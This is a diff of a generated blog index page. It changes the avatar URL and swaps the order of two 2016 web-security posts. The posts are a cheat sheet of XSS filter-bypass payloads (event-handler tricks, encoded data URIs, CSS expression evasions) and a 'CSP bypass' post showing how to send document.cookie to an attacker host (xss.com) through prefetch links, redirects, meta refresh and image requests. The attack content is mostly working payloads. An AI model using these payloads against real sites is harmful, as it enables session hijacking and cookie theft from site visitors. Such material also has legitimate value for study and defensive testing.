@@ -35,7 +35,7 @@
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
-			<img src="/assets/img/touxiang.jpg" class="js-avatar">
+			<img src="http://p1.bpimg.com/567571/d7fc961d412f8bbd.jpg" class="js-avatar">
 		</a>
 
 		<hgroup>
@@ -103,7 +103,7 @@
 	<div class="intrude-less">
 		<header id="header" class="inner">
 			<div class="profilepic">
-				<img src="/assets/img/touxiang.jpg" class="js-avatar">
+				<img src="http://p1.bpimg.com/567571/d7fc961d412f8bbd.jpg" class="js-avatar">
 			</div>
 			<hgroup>
 			  <h1 class="header-author">Adrain</h1>
@@ -598,18 +598,18 @@
 
 
   
-    <article id="post-web安全/xss向量" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-web安全/绕过csp发送cookie" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/16/web安全/xss向量/">XSS向量</a>
+      <a class="article-title" href="/2016/12/16/web安全/绕过csp发送cookie/">CSP bypass</a>
     </h1>
   
 
-        <a href="/2016/12/16/web安全/xss向量/" class="archive-article-date">
+        <a href="/2016/12/16/web安全/绕过csp发送cookie/" class="archive-article-date">
   	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
 </a>
       </header>
@@ -617,25 +617,22 @@
     <div class="article-entry" itemprop="articleBody">
       
         <ol>
-<li>css xss向量</li>
+<li>dns 預读取</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;@import%20url(http://www.xsec.io/static/upload/1.css);%20z-index:9999</div></pre></td></tr></table></figure>
+<p>firefox</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;[cookie].xss.com&quot;&gt;dns</div></pre></td></tr></table></figure>
+<p>chrome</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">chrome浏览器的csp策略对&lt;link&gt;标签rel属性则更为宽松,使用prefetch即可</div><div class="line">直接用get方式把cookie传递到攻击者的服务器上</div><div class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;</div><div class="line">只需要用js动态创建元素的方法,就可在href中插入cookie</div></pre></td></tr></table></figure>
 <ol>
-<li>利用反引号</li>
+<li>通用的bypass</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html BLAH&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;p onmouseover=alert`2`&gt;2121212&lt;/p&gt;</div><div class="line">&lt;p onmouseover=id=/confir/.source+&apos;m&apos;+&apos;(1)&apos;;onmousedown=eval(id)&gt; 11111&lt;/p&gt;</div><div class="line">&lt;a href=&quot;j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;(&amp;Tab;document.domain&amp;Tab;);//http://www.baidu.com&quot;&gt;点击此处&lt;/a&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
-<ol>
-<li>利用%2f</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;body%2fonmouseover=alert(1)&gt;&lt;/body&gt;</div></pre></td></tr></table></figure>
-<ol>
-<li><p>利用html实体<br>在href中html实体是可以反解出来的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=javascrpi:&amp;#67lert(1)&gt;xss&lt;/a&gt;</div></pre></td></tr></table></figure>
-</li>
-<li><p>其他：</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&quot;onmouseover=%0A&quot;confirm(1)</div><div class="line"></div><div class="line">/* HTML5 based entities were doing good in bypassing data URI RE */</div><div class="line"></div><div class="line">&lt;a href=&apos;data&amp;colon;text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&apos;&gt;click&lt;/a&gt;</div><div class="line">&lt;a href=&apos;data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&apos;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* Both are Firefox specific payloads */ /* The RE initially thinks that base64 keyword is necessary. */</div><div class="line"></div><div class="line">&lt;a href=&quot;data:x,% 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* The RE thinks that only alphanumeric characters are allowed after data URI */</div><div class="line"></div><div class="line">&lt;a href=&quot;data:@[&apos;&#123;§(`__`)$&#125;&apos;]@, % 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* The first two payloads bypasses the check on word expression with the help of \ */</div><div class="line"></div><div class="line">&lt;div style=&quot;x:e\x\p\r\ession(alert(1))&quot;&gt;div&lt;/div&gt;</div><div class="line">&lt;p style=&apos;\x:\65xpre\73sio\6e(alert(1))&apos;&gt;hello barracuda&lt;/p&gt;</div><div class="line"></div><div class="line">/* The regular expression was expecting ( after the keyword expression */</div><div class="line"></div><div class="line">&lt;div style=&quot;width:expression\28 alert \28 1\29 \29&quot;&gt;I will bypass you&lt;/div&gt;</div><div class="line"></div><div class="line">/* Decimal Encoding without the presence of ; bypasses the regular expression */</div><div class="line"></div><div class="line">&lt;div style=&quot;width&amp;#58expression&amp;#40alert&amp;#40 1&amp;#41&amp;#41&quot;&gt;I will not match&lt;/div&gt;</div></pre></td></tr></table></figure>
+<p>其实在script脚本允许unsafe-inline的情况下,会有更多的通用,而且无法被过滤的绕过方式,比如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>比如动态创建元素,再引发页面跳转</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var a=document.createElement(&quot;a&quot;);</div><div class="line">a.href=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</div><div class="line">a.click();</div></pre></td></tr></table></figure>
+<p>或者是使用<meta>标签进行跳转</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var i=document.createElement(&quot;img&quot;);</div><div class="line">i.src=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</div><div class="line">xxx.appendChild(i);</div></pre></td></tr></table></figure>
 
       
 
@@ -653,7 +650,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/16/web安全/xss向量/">展开全文 >></a>
+          <a class="article-more-a" href="/2016/12/16/web安全/绕过csp发送cookie/">展开全文 >></a>
         </p>
       
 
@@ -775,18 +772,18 @@
 
 
   
-    <article id="post-web安全/绕过csp发送cookie" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-web安全/xss向量" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/16/web安全/绕过csp发送cookie/">CSP bypass</a>
+      <a class="article-title" href="/2016/12/16/web安全/xss向量/">XSS向量</a>
     </h1>
   
 
-        <a href="/2016/12/16/web安全/绕过csp发送cookie/" class="archive-article-date">
+        <a href="/2016/12/16/web安全/xss向量/" class="archive-article-date">
   	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
 </a>
       </header>
@@ -794,22 +791,25 @@
     <div class="article-entry" itemprop="articleBody">
       
         <ol>
-<li>dns 預读取</li>
+<li>css xss向量</li>
 </ol>
-<p>firefox</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;[cookie].xss.com&quot;&gt;dns</div></pre></td></tr></table></figure>
-<p>chrome</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">chrome浏览器的csp策略对&lt;link&gt;标签rel属性则更为宽松,使用prefetch即可</div><div class="line">直接用get方式把cookie传递到攻击者的服务器上</div><div class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;</div><div class="line">只需要用js动态创建元素的方法,就可在href中插入cookie</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;@import%20url(http://www.xsec.io/static/upload/1.css);%20z-index:9999</div></pre></td></tr></table></figure>
 <ol>
-<li>通用的bypass</li>
+<li>利用反引号</li>
 </ol>
-<p>其实在script脚本允许unsafe-inline的情况下,会有更多的通用,而且无法被过滤的绕过方式,比如:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
-<p>比如动态创建元素,再引发页面跳转</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var a=document.createElement(&quot;a&quot;);</div><div class="line">a.href=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</div><div class="line">a.click();</div></pre></td></tr></table></figure>
-<p>或者是使用<meta>标签进行跳转</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var i=document.createElement(&quot;img&quot;);</div><div class="line">i.src=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</div><div class="line">xxx.appendChild(i);</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html BLAH&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;p onmouseover=alert`2`&gt;2121212&lt;/p&gt;</div><div class="line">&lt;p onmouseover=id=/confir/.source+&apos;m&apos;+&apos;(1)&apos;;onmousedown=eval(id)&gt; 11111&lt;/p&gt;</div><div class="line">&lt;a href=&quot;j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;(&amp;Tab;document.domain&amp;Tab;);//http://www.baidu.com&quot;&gt;点击此处&lt;/a&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<ol>
+<li>利用%2f</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;body%2fonmouseover=alert(1)&gt;&lt;/body&gt;</div></pre></td></tr></table></figure>
+<ol>
+<li><p>利用html实体<br>在href中html实体是可以反解出来的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=javascrpi:&amp;#67lert(1)&gt;xss&lt;/a&gt;</div></pre></td></tr></table></figure>
+</li>
+<li><p>其他：</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&quot;onmouseover=%0A&quot;confirm(1)</div><div class="line"></div><div class="line">/* HTML5 based entities were doing good in bypassing data URI RE */</div><div class="line"></div><div class="line">&lt;a href=&apos;data&amp;colon;text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&apos;&gt;click&lt;/a&gt;</div><div class="line">&lt;a href=&apos;data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&apos;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* Both are Firefox specific payloads */ /* The RE initially thinks that base64 keyword is necessary. */</div><div class="line"></div><div class="line">&lt;a href=&quot;data:x,% 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* The RE thinks that only alphanumeric characters are allowed after data URI */</div><div class="line"></div><div class="line">&lt;a href=&quot;data:@[&apos;&#123;§(`__`)$&#125;&apos;]@, % 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* The first two payloads bypasses the check on word expression with the help of \ */</div><div class="line"></div><div class="line">&lt;div style=&quot;x:e\x\p\r\ession(alert(1))&quot;&gt;div&lt;/div&gt;</div><div class="line">&lt;p style=&apos;\x:\65xpre\73sio\6e(alert(1))&apos;&gt;hello barracuda&lt;/p&gt;</div><div class="line"></div><div class="line">/* The regular expression was expecting ( after the keyword expression */</div><div class="line"></div><div class="line">&lt;div style=&quot;width:expression\28 alert \28 1\29 \29&quot;&gt;I will bypass you&lt;/div&gt;</div><div class="line"></div><div class="line">/* Decimal Encoding without the presence of ; bypasses the regular expression */</div><div class="line"></div><div class="line">&lt;div style=&quot;width&amp;#58expression&amp;#40alert&amp;#40 1&amp;#41&amp;#41&quot;&gt;I will not match&lt;/div&gt;</div></pre></td></tr></table></figure>
 
       
 
@@ -827,7 +827,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/16/web安全/绕过csp发送cookie/">展开全文 >></a>
+          <a class="article-more-a" href="/2016/12/16/web安全/xss向量/">展开全文 >></a>
         </p>
       
 
